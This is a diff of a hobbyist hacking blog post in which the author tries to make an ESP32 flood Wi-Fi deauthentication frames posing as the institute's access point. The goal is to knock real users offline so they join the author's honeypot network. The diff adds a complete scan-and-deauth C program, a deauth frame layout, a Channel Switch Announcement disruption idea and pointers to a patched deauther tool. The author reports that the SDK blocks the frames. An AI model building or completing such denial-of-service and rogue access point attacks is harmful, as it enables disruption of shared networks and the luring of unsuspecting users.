@@ -5,18 +5,18 @@ draft = false
 
 [taxonomies]
 categories = ["Hacking", "Hardware"]
-tags = ["Hardware", "Networks", "Cysec", "blog"]
+tags = ["Hardware", "Networks", "Cysec", "blog", "ESP32"]
 
 [extra]
 lang = "en"
 +++
 
-ESP32 has a wifi adapter inbuilt. It also apparently allows you to send raw wifi packets if you use the ESP-IDF framework and the ieee80211_raw_frame_sanity_check(), an actual bypass that was found after reverse engineering the ESP-IDF source code and binaries. 
+ESP32 has a wifi adapter inbuilt. It also apparently allows you to send raw wifi packets if you use the ESP-IDF framework and the `ieee80211_raw_frame_sanity_check()`, an actual bypass that was found after reverse engineering the ESP-IDF source code and binaries. 
 
 The reason I wanna do this is because otherwise people won't be incentivised to click on my honepot, 2 reasons for this
 
 1. It is free and hence less trustworth in the minds of the people
-2. People generally don't check available networks (cause most of the times, it automatically connects)
+2. People generally don't check available networks (cause most of the times, their phones automatically connect)
 
 If I can broadcast deauthentication frames posing as my insti AP, and then perform a DoS attack, they will be forced to notice my "iitmwifi_6g" and boom, gotcha!
 
@@ -26,25 +26,210 @@ I shall do this for another time. If you are `still interested` in going through
 
 ## Installing ESP-IDF v5.4 (latest)
 
+The first thing I found that should be done to send raw wifi packets is to use `esp_wifi_80211_tx()` which is a low level API that directly talks to the ESP32 wifi adapter. In order to do that I had to install ESP-IDF and I naively installed the latest version (reasons for the naivety will be clear soon).
+
+[The ESP-IDF](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/get-started/linux-macos-setup.html) website is the best guide to follow, and I did exactly as they mentioned.
+
 - Problems in deauth frames
-- Types of frames (testing Action frames and channel switching)
-- Deauth support removed from v5.2 onwards apparently
 
-## Installing ESP-IDF v5.2
+Here is how I was trying to send the deauth frames
 
-- deauth frames still not working
-- Fucked
+```c
+#include <string.h>
+#include "freertos/FreeRTOS.h"
+#include "esp_wifi.h"
+#include "esp_log.h"
+#include "nvs_flash.h"
+#include "esp_event.h"
+#include "esp_netif.h"
+
+static const char *TAG = "DEAUTH";
+#define TARGET_SSID "motog73"
+
+void wifi_scan_and_deauth() {
+    ESP_LOGI(TAG, "Inside wifi scan and deauth");
+
+    // Scan configuration
+    wifi_scan_config_t scan_config = {
+        .ssid = NULL,
+        .bssid = NULL,
+        .channel = 0,
+        .show_hidden = true
+    };
+
+    // Perform scan
+    esp_err_t scan_result = esp_wifi_scan_start(&scan_config, true);
+    if (scan_result != ESP_OK) {
+        ESP_LOGE(TAG, "Scan start failed: %s", esp_err_to_name(scan_result));
+        return;
+    }
+
+    // Get number of APs
+    uint16_t ap_count = 0;
+    esp_err_t ap_num_result = esp_wifi_scan_get_ap_num(&ap_count);
+    if (ap_num_result != ESP_OK) {
+        ESP_LOGE(TAG, "Get AP number failed: %s", esp_err_to_name(ap_num_result));
+        return;
+    }
+
+    ESP_LOGI(TAG, "Found %d access points", ap_count);
+
+    // Allocate AP records
+    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
+    esp_err_t ap_records_result = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
+    if (ap_records_result != ESP_OK) {
+        ESP_LOGE(TAG, "Get AP records failed: %s", esp_err_to_name(ap_records_result));
+        free(ap_records);
+        return;
+    }
+
+    // Find target network
+    uint8_t target_bssid[6] = {0};
+    bool target_found = false;
+    for (int i = 0; i < ap_count; i++) {
+        ESP_LOGI(TAG, "Found AP: %s", ap_records[i].ssid);
+        if (strcmp((char*)ap_records[i].ssid, TARGET_SSID) == 0) {
+            memcpy(target_bssid, ap_records[i].bssid, 6);
+            target_found = true;
+            break;
+        }
+    }
+
+    if (!target_found) {
+        ESP_LOGE(TAG, "Target SSID '%s' not found", TARGET_SSID);
+        free(ap_records);
+        return;
+    }
+
+    // Switch to AP Mode (Required for sending deauth)
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+
+    // Deauth frame
+    uint8_t deauth_frame[26] = {
+        0x0c, 0x00,   // Frame Control (Deauth)
+        0x00, 0x00,   // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Receiver Address (Broadcast)
+        target_bssid[0], target_bssid[1], target_bssid[2], 
+        target_bssid[3], target_bssid[4], target_bssid[5],  // Source Address (AP)
+        target_bssid[0], target_bssid[1], target_bssid[2], 
+        target_bssid[3], target_bssid[4], target_bssid[5],  // BSSID (AP)
+        0x00, 0x00,   // Fragment and Sequence Number
+        0x07, 0x00    // Reason Code: Class 3 frame received from nonassociated station
+    };
+
+    // Send deauth frame
+
+    while(true){
+    esp_err_t tx_result = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
+    if (tx_result != ESP_OK) {
+        ESP_LOGE(TAG, "Deauth frame transmission failed: %s", esp_err_to_name(tx_result));
+    } else {
+        ESP_LOGI(TAG, "Deauth frame sent successfully");
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(100));
+}
+}
+
+void app_main() {
+    ESP_LOGI(TAG, "Starting!");
+
+    // Initialize NVS
+    esp_err_t ret = nvs_flash_init();
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+        ESP_ERROR_CHECK(nvs_flash_erase());
+        ret = nvs_flash_init();
+    }
+    ESP_ERROR_CHECK(ret);
+
+    // Initialize network interface
+    ESP_ERROR_CHECK(esp_netif_init());
+    ESP_ERROR_CHECK(esp_event_loop_create_default());
+    esp_netif_create_default_wifi_ap();
+
+    // Initialize WiFi
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+
+    // Use AP + STA Mode to enable both scanning and deauth
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
+    ESP_ERROR_CHECK(esp_wifi_start());
+
+    // Scan and deauth
+    wifi_scan_and_deauth();
+}
+```
+
+The rest is basically boiler plate code that you can find in the `examples` section, but the important one was the structure of the deauthentication frame. You can find the exact structure implementation in this [blog post](https://blog.spacehuhn.com/wifi-deauthentication-frame) and this is what I copied.
+
+The idea here being that we first scan for a certain SSID which is basically the wifi's name and through that find its BSSID which is the Access Point's MAC address (physical address). Now, according to the blog post the structure of the frame should be something like this,
+
+```c
+uint8_t deauthPacket[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
+    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
+    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
+    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
+};
+```
+
+Yeah they did mention that this is supposed to be for ESP8266 cause it internally handles the rest.
+
+> You might notice that some data is left out of this array. For example, the frame check sequence (FCS) is not defined here. That's because it's already handled by the underlying ESP8266 SDK functions automatically. 
+
+But as far as I know, it didn't seem to make a difference, because the error I got was 
+
+> [!TIP]
+> 0xC0 is an unsupported frame type
+
+Well this means that there is nothing I can do now! I tried changing it to `0xA0` which is the authentication frame and used the authentication frame setup but ESP-IDF won't allow that as well. The only thing that it sends properly is the action frame (`0xD0`) but I didn't extensively test this out yet.
+
+okay, its been a few hours and I learnt that support for `0xC0` was removed in versions 5.2 and above. We'll that gives something new to try now!
+
+## Installing lower versions
+
+Man! The problem with cloning this is that its so fucking big, and a bad internet connection (unstable or slow) means you will never be able to do it because it will inevitably drop frames.
+
+Had to rush to the library for this, it gives 4Mbps which is good enough and stable enough. This is the cloning script I am using now,
+
+```sh
+mkdir -p ~/esp
+cd ~/esp
+git clone -b v5.2 --recursive https://github.com/espressif/esp-idf.git
+```
+
+Ran the same c code again, and it won't work. Getting the same error. Some sources are pointing at an even lower version (4.2 now). Honestly I have zero hopes but lets give that as well a try.
+
+```sh
+mkdir -p ~/esp
+cd ~/esp
+git clone -b v4.2 --recursive https://github.com/espressif/esp-idf.git
+```
+
+Uploaded, ran and hahaha, didn't work.
 
 ## Trying action frames 
 
-- Random switching of channel
-- Multiple auth frames in hopes of Denial of Service
+So, since action frames work, I am going to try something with `0xD0`. Reading more on action frames, I figured this out
+
+> The Channel Switch Announcement element is used by an AP in a BSS, a STA in an IBSS, or a mesh STA in an MBSS to advertise when it is changing to a new channel and the channel number of the new channel. The format of the Channel Switch Announcement element is shown below (source IEEE 802.11-2012)
+
+{{ figure(src="./assets/IEEE_802_11_2012.png", alt="CSA element format diagram", caption="CSA format diagram") }}
+
+The idea being that a `Channel Switch Annoucement` can potentially be used to deauthenticate a user. If for example you're connected to your wifi using channel 1 and it suddenly asks you to switch to channel 6 then there **might** be a small time interval of disconnect followed by a reconnect.
+
+If we can time this perfectly and send multiple CSA signals with different channels each time, the switching can be such that at any given time the connection is not present! Thus, the user will feel the need to check the wifi networks and boom, goal achieved.
+
+So, I tried this but... either my ESP is cupping or this ain't working. I mean it did seem too easy... why would they go and remove support for deauth frames and leave action frames if they were equally harmful?
 
 ## Trying to reverse the ESP-IDF library 
 
-- It's definetly not a hardware issue
-- So, if we patch the software -- we can allow deauth frames 
-- Jenja has already done that (better than I can do for sure)
+From what I learnt, it is definetly not a hardware issue cause the ESP32 chip **can** send raw wifi packets. I know its the ESP-IDF library. So, if we patch the software -- we can allow deauth frames to be sent!
+
+I am pretty sure this has been done before, but maybe that patch was also patched? (get it?)
 
 ### Finding esp_wifi_80211_tx
 
@@ -111,9 +296,9 @@ I was being too ambitious. After a bit of researching I found that the implement
 
 ## Alternative approach
 
-https://github.com/GANESH-ICMC/esp32-deauther/tree/master
+https://github.com/GANESH-ICMC/esp32-deauther/
 
-Found this cool github project that supposedly bypasses the `invalid arguments` error and sends the deauth frames anyway without using the in-built `idf.py build` function.
+Found this cool github project that supposedly bypasses the `invalid arguments` error and sends the deauth frames anyway without using the in-built `idf.py build` function. This was the `patch` that I claimed would've been done before...
 
 So, this requires us to use `make` instead of `idf.py build`, What exactly is the difference between `idf.py build` and `make`? I don't know. Going through issue#3 tells that
 
@@ -174,7 +359,7 @@ My honeypot code is below, its really simple actually but quite fun.
 
 ---
 
-Alright, unsupported frame type again for 0xC0. I guess they had removed support for 0xC0 in all versions of esp-idf. Testing the GitHub repo patch now.
+Alright, __unsupported frame__ type again for 0xC0. I guess they had removed support for 0xC0 in all versions of esp-idf. Testing the GitHub repo patch now.
 
 I don't think its working. Two explanations
 
